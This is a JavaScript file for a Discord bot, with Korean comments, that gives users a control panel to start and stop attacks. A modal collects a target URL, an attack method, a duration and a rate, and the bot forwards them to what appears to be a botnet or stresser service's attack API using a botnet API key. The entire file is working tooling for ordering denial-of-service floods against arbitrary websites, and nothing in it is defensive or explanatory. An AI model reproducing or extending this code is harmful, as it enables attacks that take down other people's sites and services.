// panel.js (핵심 변경만)
import {
  ActionRowBuilder, ButtonBuilder, ButtonStyle,
  ModalBuilder, TextInputBuilder, TextInputStyle,
  InteractionType
} from "discord.js";
import fetch from "node-fetch";

const API_KEY = process.env.BOTNET_API_KEY;
const BASE_URL = "https://stressnet.su/api/attack";

export function setupPanel(client) {
  client.on("messageCreate", async (message) => {
    if (message.author.bot) return;
    if (message.content === "!패널") {
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId("start").setLabel("Start Attack").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId("stop").setLabel("Stop Attack").setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId("stopall").setLabel("Stop All").setStyle(ButtonStyle.Secondary),
      );
      await message.channel.send({ content: "⚙️ Control Panel", components: [row] });
    }
  });

  client.on("interactionCreate", async (interaction) => {
    // ----- 버튼 처리 -----
    if (interaction.isButton()) {
      if (interaction.customId === "start") {
        const modal = new ModalBuilder().setCustomId("attackModal").setTitle("Start Attack");
        const target = new TextInputBuilder().setCustomId("target").setLabel("Target (예: http://example.org)").setStyle(TextInputStyle.Short).setRequired(true);
        const method = new TextInputBuilder().setCustomId("method").setLabel("Method (TLS/HTTPS/MIX/VSE/QUANTUM/...)").setStyle(TextInputStyle.Short).setRequired(true);
        const time   = new TextInputBuilder().setCustomId("time").setLabel("Time (min. 60)").setStyle(TextInputStyle.Short).setPlaceholder("120").setRequired(true);
        const rate   = new TextInputBuilder().setCustomId("rate").setLabel("Rate (1–32)").setStyle(TextInputStyle.Short).setPlaceholder("32").setRequired(true);

        modal.addComponents(
          new ActionRowBuilder().addComponents(target),
          new ActionRowBuilder().addComponents(method),
          new ActionRowBuilder().addComponents(time),
          new ActionRowBuilder().addComponents(rate),
        );
        await interaction.showModal(modal);
        return;
      }

      if (interaction.customId === "stop") {
        await interaction.deferReply({ ephemeral: true });
        try {
          const url = `${BASE_URL}/stop/${API_KEY}/?uuid=YOUR_ATTACK_ID`;
          const { text } = await fetchWithTimeout(url);
          await interaction.editReply(`🛑 Stop Attack\n\`\`\`${trimCodeBlock(text)}\`\`\``);
        } catch (err) {
          await interaction.editReply(`❌ 요청 실패: ${fmtErr(err)}`);
        }
        return;
      }

      if (interaction.customId === "stopall") {
        await interaction.deferReply({ ephemeral: true });
        try {
          const url = `${BASE_URL}/stop-all/${API_KEY}`;
          const { text } = await fetchWithTimeout(url);
          await interaction.editReply(`🛑 Stop All Attacks\n\`\`\`${trimCodeBlock(text)}\`\`\``);
        } catch (err) {
          await interaction.editReply(`❌ 요청 실패: ${fmtErr(err)}`);
        }
        return;
      }
    }

    // ----- 모달 제출 처리 -----
    if (interaction.type === InteractionType.ModalSubmit && interaction.customId === "attackModal") {
      const target = interaction.fields.getTextInputValue("target");
      const method = interaction.fields.getTextInputValue("method").toUpperCase();
      const time   = interaction.fields.getTextInputValue("time");
      const rate   = interaction.fields.getTextInputValue("rate");

      // (선택) 입력 검증 – 바로 피드백 가능
      const tNum = Number(time), rNum = Number(rate);
      if (!Number.isFinite(tNum) || tNum < 60 || !Number.isFinite(rNum) || rNum < 1 || rNum > 32) {
        await interaction.reply({ content: "⚠️ time은 60 이상, rate는 1–32 사이여야 해요.", ephemeral: true });
        return;
      }

      await interaction.deferReply({ ephemeral: true });
      try {
        const url = `${BASE_URL}/start/${API_KEY}/?target=${encodeURIComponent(target)}&time=${tNum}&method=${encodeURIComponent(method)}&rate=${rNum}`;
        const { text } = await fetchWithTimeout(url);
        await interaction.editReply(
          [
            "📡 Start Attack 요청됨",
            `Target: ${target}`,
            `Method: ${method}`,
            `Time: ${tNum}`,
            `Rate: ${rNum}`,
            "",
            "응답:",
            "```",
            trimCodeBlock(text),
            "```"
          ].join("\n")
        );
      } catch (err) {
        await interaction.editReply(`❌ 요청 실패: ${fmtErr(err)}`);
      }
      return;
    }
  });
}

// ----- 유틸 -----
function trimCodeBlock(s) {
  if (!s) return "";
  return String(s).slice(0, 1900); // 디스코드 메시지 길이 보호
}

function fmtErr(e) {
  return e?.name === "AbortError" ? "요청 시간 초과" : (e?.message || String(e));
}

async function fetchWithTimeout(url, ms = 8000) {
  const controller = new AbortController();
  const t = setTimeout(() => controller.abort(), ms);
  const res = await fetch(url, { signal: controller.signal });
  const text = await res.text();
  clearTimeout(t);
  return { res, text };
}
